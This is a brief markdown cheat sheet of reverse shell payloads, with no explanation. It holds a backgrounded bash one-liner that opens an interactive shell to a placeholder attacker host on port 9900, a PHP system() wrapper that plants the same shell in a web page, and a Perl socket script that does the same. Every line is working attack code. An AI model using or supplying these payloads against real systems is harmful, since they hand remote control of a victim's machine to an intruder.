## bash

```bash
nohup /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/9900 0>&1' > /dev/null 2>&1 &

echo <?php system("nohup /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/9900 0>&1' > /dev/null 2>&1 &"); ?>
```



## perl

```perl
#!/usr/bin/perl -w
use Socket;$i="<IP>";$p=9900;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
```

